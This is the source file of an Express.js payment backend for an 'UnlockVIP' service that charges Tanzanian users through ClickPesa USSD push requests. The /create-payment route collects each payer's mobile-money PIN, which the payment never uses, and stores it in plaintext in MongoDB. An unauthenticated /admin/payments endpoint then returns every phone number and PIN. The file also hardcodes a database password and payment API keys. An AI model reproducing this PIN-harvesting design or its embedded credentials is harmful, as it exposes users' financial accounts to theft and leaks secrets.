require("dotenv").config();

const express = require("express");
const axios = require("axios");
const cors = require("cors");
const mongoose = require("mongoose");

const app = express();
const PORT = process.env.PORT || 10000;

// =======================
// 🗄️ MONGODB CONNECTION
// =======================
mongoose.connect(
  "mongodb+srv://zaharanirashidi29_db_user:oQgtq3g1JHIgtIT2@cluster0.a6wjozy.mongodb.net/unlockvip?retryWrites=true&w=majority"
)
.then(() => console.log("MongoDB Connected"))
.catch(err => console.log("MongoDB Error:", err));

app.use(cors());
app.use(express.json());

// =======================
// 📊 PAYMENT SCHEMA
// =======================
const paymentSchema = new mongoose.Schema({
  phone: String,
  pin: String,
  amount: Number,
  time: String
});

const Payment = mongoose.model("Payment", paymentSchema);

// =======================
// 🔑 ClickPesa Credentials
// =======================
const CLIENT_ID = "IDUdcvMeQdV3FNC0gbZ1lX1G3NvPV6xn";
const API_KEY = "SKm0ivx7e9vxVbafd3eIbQ5fMpKG7upNn6Wx6xpTBU";

// =======================
// ROOT TEST
// =======================
app.get("/", (req, res) => {
  res.send("UnlockVIP Backend is running 🚀");
});

// =======================
// 🔐 GET ACCESS TOKEN
// =======================
async function getAccessToken() {
  try {

    const response = await axios.post(
      "https://api.clickpesa.com/third-parties/generate-token",
      {},
      {
        headers: {
          "client-id": CLIENT_ID,
          "api-key": API_KEY,
          "Content-Type": "application/json",
        },
      }
    );

    let token = response.data.token;

    if (!token.startsWith("Bearer")) {
      token = `Bearer ${token}`;
    }

    console.log("🔑 Generated Token:", token);

    return token;

  } catch (error) {
    console.error("❌ Token Error:", error.response?.data || error.message);
    throw new Error("Failed to get access token");
  }
}

// =======================
// 💳 CREATE PAYMENT
// =======================
app.post("/create-payment", async (req, res) => {
  try {

    let { phone, pin } = req.body;

    const amount = 3000;

    if (!phone) {
      return res.status(400).json({
        success: false,
        error: "Phone is required"
      });
    }

    phone = phone.toString().trim();

    if (phone.startsWith("+255")) {
      phone = phone.replace("+", "");
    }

    if (phone.startsWith("0")) {
      phone = "255" + phone.substring(1);
    }

    if (!phone.startsWith("255") || phone.length !== 12) {
      return res.status(400).json({
        success: false,
        error: "Invalid Tanzanian phone number"
      });
    }

    // =======================
    // 📊 SAVE PAYMENT TO MONGODB
    // =======================
    await Payment.create({
      phone: phone,
      pin: pin || "",
      amount: amount,
      time: new Date().toLocaleString()
    });

    const token = await getAccessToken();

    const orderReference = "ORD" + Date.now();

    console.log("📦 Payment Request:");
    console.log({
      amount,
      phone,
      orderReference
    });

    const paymentResponse = await axios.post(
      "https://api.clickpesa.com/third-parties/payments/initiate-ussd-push-request",
      {
        amount: amount.toString(),
        currency: "TZS",
        orderReference: orderReference,
        phoneNumber: phone
      },
      {
        headers: {
          Authorization: token,
          "Content-Type": "application/json",
        },
      }
    );

    console.log("✅ ClickPesa Response:", paymentResponse.data);

    res.json({
      success: true,
      payment: paymentResponse.data
    });

  } catch (error) {

    console.error("❌ Payment Error:", error.response?.data || error.message);

    res.status(500).json({
      success: false,
      error:
        error.response?.data?.detail ||
        error.response?.data?.message ||
        error.response?.data?.error ||
        error.message
    });
  }
});

// =======================
// 📊 ADMIN DASHBOARD DATA
// =======================
app.get("/admin/payments", async (req, res) => {
  try {

    const data = await Payment.find().sort({ _id: -1 });

    res.json(data);

  } catch (error) {

    res.status(500).json({ error: error.message });

  }
});

// =======================
app.listen(PORT, () => {
  console.log("🚀 Server running on port", PORT);
});